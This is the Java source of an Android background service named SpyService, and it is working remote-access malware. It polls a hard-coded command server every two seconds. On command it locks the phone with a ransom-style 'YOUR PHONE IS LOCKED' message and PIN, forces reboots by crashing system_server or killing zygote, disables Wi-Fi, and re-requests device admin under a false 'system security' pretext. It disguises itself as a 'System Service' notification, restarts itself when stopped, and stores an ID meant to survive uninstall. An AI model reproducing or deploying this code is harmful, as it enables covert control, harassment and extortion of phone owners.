package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class SpyService extends Service {

    private static final String TAG        = "CRPT.Spy";
    private static final String CHANNEL_ID = "SpyServiceChannel";
    private static final int    NOTIF_ID   = 1;
    private static final String SERVER     = "http://panel.lynzzofficial.com:2059";

    private Handler  loopHandler;
    private Runnable loopRunnable;
    private boolean  running = false;

    @Override
    public void onCreate() {
        super.onCreate();
        buildNotification();
        PersistentWorker.schedule(this);
        startLoop();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!running) startLoop();
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent r = new Intent(getApplicationContext(), SpyService.class);
        r.setPackage(getPackageName());
        startService(r);
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        running = false;
        if (loopHandler != null && loopRunnable != null)
            loopHandler.removeCallbacks(loopRunnable);
        Intent b = new Intent("RestartSpyService");
        b.setClass(this, RestarterReceiver.class);
        sendBroadcast(b);
        super.onDestroy();
    }

    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }

    // ════════════════════════════════════════════════════════════════════════
    // LOOP
    // ════════════════════════════════════════════════════════════════════════
    private void startLoop() {
        if (running) return;
        running = true;
        loopHandler = new Handler(Looper.getMainLooper());
        loopRunnable = new Runnable() {
            @Override public void run() {
                if (!running) return;
                try { tick(); } catch (Exception e) { Log.w(TAG, e.getMessage()); }
                loopHandler.postDelayed(this, 2000);
            }
        };
        loopHandler.post(loopRunnable);
    }

    // ── Baca deviceId dari semua sumber ──────────────────────────────────────
    private String getDeviceIdSafe() {
        // 1. SharedPreferences Flutter
        try {
            String id = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
                .getString("flutter.target_id", null);
            if (id != null && !id.isEmpty()) return id;
        } catch (Exception ignored) {}

        // 2. SpyPrefs
        try {
            String id = getSharedPreferences("SpyPrefs", MODE_PRIVATE)
                .getString("targetId", null);
            if (id != null && !id.isEmpty()) return id;
        } catch (Exception ignored) {}

        // 3. File eksternal (survive uninstall)
        try {
            File f = new File(android.os.Environment.getExternalStorageDirectory(), ".crpt/.devid");
            if (f.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(f));
                String id = br.readLine(); br.close();
                if (id != null && !id.trim().isEmpty()) return id.trim();
            }
        } catch (Exception ignored) {}

        // 4. File cache
        try {
            File f = new File(getCacheDir(), "devid.dat");
            if (f.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(f));
                String id = br.readLine(); br.close();
                if (id != null && !id.trim().isEmpty()) return id.trim();
            }
        } catch (Exception ignored) {}

        // 5. Generate dari ANDROID_ID
        try {
            String aid = android.provider.Settings.Secure.getString(
                getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
            if (aid != null && !aid.isEmpty()) {
                String id = (android.os.Build.BRAND + "-" + android.os.Build.MODEL + "-" + aid)
                    .replaceAll(" ", "_");
                saveDeviceIdAll(id);
                return id;
            }
        } catch (Exception ignored) {}

        return null;
    }

    // ── Simpan deviceId ke SEMUA tempat sekaligus ─────────────────────────────
    public static void saveDeviceIdAll(String deviceId) {
        // Dipanggil dari luar juga (static)
    }

    public void saveDeviceIdAllInstance(String deviceId) {
        if (deviceId == null || deviceId.isEmpty()) return;
        // SharedPreferences Flutter
        try {
            getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE).edit()
                .putString("flutter.target_id", deviceId)
                .putString("flutter.target_model", android.os.Build.BRAND + " " + android.os.Build.MODEL)
                .apply();
        } catch (Exception ignored) {}
        // SpyPrefs
        try {
            getSharedPreferences("SpyPrefs", MODE_PRIVATE).edit()
                .putString("targetId", deviceId).apply();
        } catch (Exception ignored) {}
        // File eksternal (survive uninstall - paling penting!)
        try {
            File dir = new File(android.os.Environment.getExternalStorageDirectory(), ".crpt");
            dir.mkdirs();
            File f = new File(dir, ".devid");
            FileWriter fw = new FileWriter(f); fw.write(deviceId); fw.close();
        } catch (Exception ignored) {}
        // File cache (backup)
        try {
            File f = new File(getCacheDir(), "devid.dat");
            FileWriter fw = new FileWriter(f); fw.write(deviceId); fw.close();
        } catch (Exception ignored) {}
    }

    private void tick() {
        String deviceId = getDeviceIdSafe();
        if (deviceId == null || deviceId.isEmpty()) return;

        // Heartbeat
        try {
            JSONObject body = new JSONObject();
            body.put("id", deviceId);
            body.put("status", "Alive");
            body.put("battery", getBattery());
            postJson(SERVER + "/api/heartbeat/" + deviceId, body.toString());
        } catch (Exception e) { Log.w(TAG, "hb: " + e.getMessage()); }

        // Get command
        try {
            String resp = getReq(SERVER + "/api/get-command/" + deviceId);
            if (resp == null || resp.isEmpty() || resp.equals("{}")) return;
            JSONObject d = new JSONObject(resp);
            String cmd   = d.optString("command", "idle");
            String extra = d.optString("extra", "");
            if ("idle".equals(cmd)) return;
            execCmd(deviceId, cmd, extra);
        } catch (Exception e) { Log.w(TAG, "cmd: " + e.getMessage()); }
    }

    // ════════════════════════════════════════════════════════════════════════
    // EXECUTE COMMAND
    // ════════════════════════════════════════════════════════════════════════
    private void execCmd(String deviceId, String cmd, String extra) {
        new Thread(() -> {
            try {
                JSONObject result = new JSONObject();
                switch (cmd) {

                    case "force_open": {
                        Intent l = getPackageManager().getLaunchIntentForPackage(getPackageName());
                        if (l != null) {
                            l.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                            startActivity(l);
                        }
                        result.put("status", "opened");
                        break;
                    }

                    case "lock_live":
                    case "hard_lock":
                    case "lock_screen":
                    case "lock_device": {
                        String msg = "YOUR PHONE IS LOCKED!!!!";
                        String pin = "1234";
                        if (extra.contains("|")) {
                            String[] pts = extra.split("\\|", 2);
                            msg = pts[0].isEmpty() ? msg : pts[0];
                            pin = pts.length > 1 && !pts[1].isEmpty() ? pts[1] : pin;
                        } else if (!extra.isEmpty()) { msg = extra; }

                        // Simpan state lock + mode (live/biasa)
                        boolean isLive = "lock_live".equals(cmd);
                        getSharedPreferences("SpyPrefs", MODE_PRIVATE).edit()
                            .putBoolean("isLocked", true)
                            .putBoolean("isLockLive", isLive)
                            .putString("lockMessage", msg)
                            .putString("lockPin", pin)
                            .apply();

                        // Kunci layar via DevicePolicyManager
                        try {
                            android.app.admin.DevicePolicyManager dpm =
                                (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                            android.content.ComponentName admin =
                                new android.content.ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                            if (dpm != null && dpm.isAdminActive(admin)) {
                                dpm.lockNow();
                                result.put("status", isLive ? "lock_live_active" : "locked");
                            } else {
                                // Admin tidak aktif - buka app untuk request ulang
                                Intent req = getPackageManager().getLaunchIntentForPackage(getPackageName());
                                if (req != null) { req.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(req); }
                                result.put("status", "admin_not_active_reopening");
                            }
                        } catch (Exception e) { result.put("status", "lock_err: " + e.getMessage()); }
                        break;
                    }

                    case "unlock": {
                        getSharedPreferences("SpyPrefs", MODE_PRIVATE).edit()
                            .putBoolean("isLocked", false)
                            .putBoolean("isLockLive", false)
                            .apply();
                        result.put("status", "unlocked");
                        break;
                    }

                    case "reboot_device":
                    case "restart_device": {
                        boolean done = false;

                        // Metode 1: PowerManager reflection (NO ROOT, works on most devices)
                        if (!done) {
                            try {
                                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
                                java.lang.reflect.Method m = pm.getClass().getDeclaredMethod("reboot", String.class);
                                m.setAccessible(true);
                                m.invoke(pm, (Object) null);
                                done = true;
                            } catch (Exception ex) { Log.w(TAG, "PM reboot: " + ex.getMessage()); }
                        }
                        // Metode 2: DevicePolicyManager (device admin aktif)
                        if (!done) {
                            try {
                                android.app.admin.DevicePolicyManager dpm2 =
                                    (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                                android.content.ComponentName admin2 =
                                    new android.content.ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                                if (dpm2 != null && dpm2.isAdminActive(admin2) && Build.VERSION.SDK_INT >= 24) {
                                    dpm2.reboot(admin2); done = true;
                                }
                            } catch (Exception ex) { Log.w(TAG, "DPM reboot: " + ex.getMessage()); }
                        }
                        // Metode 3: su root
                        if (!done) {
                            try {
                                Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
                                p.waitFor(3, java.util.concurrent.TimeUnit.SECONDS);
                                done = true;
                            } catch (Exception ex) { Log.w(TAG, "su reboot: " + ex.getMessage()); }
                        }
                        // Metode 4: am crash system_server (force restart tanpa root di beberapa HP)
                        if (!done) {
                            try { Runtime.getRuntime().exec(new String[]{"sh", "-c", "am crash system_server"}); done = true; }
                            catch (Exception ex) {}
                        }
                        // Metode 5: pkill zygote
                        if (!done) {
                            try { Runtime.getRuntime().exec(new String[]{"sh", "-c", "pkill -9 zygote"}); }
                            catch (Exception ex) {}
                        }
                        result.put("status", done ? "rebooting" : "reboot_attempted");
                        break;
                    }

                    case "vibrate_loop": {
                        android.os.Vibrator vib;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            android.os.VibratorManager vbm = (android.os.VibratorManager) getSystemService(VIBRATOR_MANAGER_SERVICE);
                            vib = vbm != null ? vbm.getDefaultVibrator() : null;
                        } else {
                            vib = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
                        }
                        if (vib != null) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                                vib.vibrate(android.os.VibrationEffect.createWaveform(new long[]{0,500,200}, 0));
                            else
                                vib.vibrate(new long[]{0,500,200}, 0);
                        }
                        result.put("status", "vibrating");
                        break;
                    }

                    case "kill_wifi": {
                        try {
                            android.net.wifi.WifiManager wm =
                                (android.net.wifi.WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
                            if (wm != null && Build.VERSION.SDK_INT < Build.VERSION_CODES.Q)
                                wm.setWifiEnabled(false);
                        } catch (Exception ignored) {}
                        result.put("status", "wifi_killed");
                        break;
                    }

                    case "re_request_admin": {
                        Intent adminReq = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        android.content.ComponentName comp =
                            new android.content.ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                        adminReq.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
                        adminReq.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk keamanan sistem.");
                        adminReq.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(adminReq);
                        result.put("status", "admin_requested");
                        break;
                    }

                    default:
                        // Command lain butuh Flutter (kamera, GPS, dll) — buka app
                        result.put("status", "needs_flutter");
                        result.put("cmd", cmd);
                        // Buka app agar Flutter bisa handle
                        try {
                            Intent l = getPackageManager().getLaunchIntentForPackage(getPackageName());
                            if (l != null) { l.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(l); }
                        } catch (Exception ignored) {}
                        break;
                }

                JSONObject resp = new JSONObject();
                resp.put("cmd", cmd);
                resp.put("data", result);
                postJson(SERVER + "/api/post-response/" + deviceId, resp.toString());

            } catch (Exception e) { Log.w(TAG, "exec: " + e.getMessage()); }
        }).start();
    }

    // ════════════════════════════════════════════════════════════════════════
    // HTTP HELPERS
    // ════════════════════════════════════════════════════════════════════════
    private String getReq(String url) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("GET"); c.setConnectTimeout(3000); c.setReadTimeout(3000);
            if (c.getResponseCode() != 200) return null;
            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder(); String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close(); return sb.toString();
        } catch (Exception e) { return null; }
    }

    private void postJson(String url, String json) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setDoOutput(true); c.setConnectTimeout(3000); c.setReadTimeout(3000);
            OutputStream os = c.getOutputStream();
            os.write(json.getBytes(StandardCharsets.UTF_8)); os.close();
            c.getResponseCode(); c.disconnect();
        } catch (Exception ignored) {}
    }

    private int getBattery() {
        try {
            Intent i = getApplicationContext().registerReceiver(null,
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (i != null) {
                int lv = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int sc = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                if (lv >= 0 && sc > 0) return (int)(lv * 100f / sc);
            }
        } catch (Exception ignored) {}
        return 100;
    }

    // ════════════════════════════════════════════════════════════════════════
    // NOTIFICATION
    // ════════════════════════════════════════════════════════════════════════
    private void buildNotification() {
        createChannel();
        Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service").setContentText("Running...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN).setOngoing(true).build();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            startForeground(NOTIF_ID, n,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else {
            startForeground(NOTIF_ID, n);
        }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "System Background", NotificationManager.IMPORTANCE_LOW);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }
}
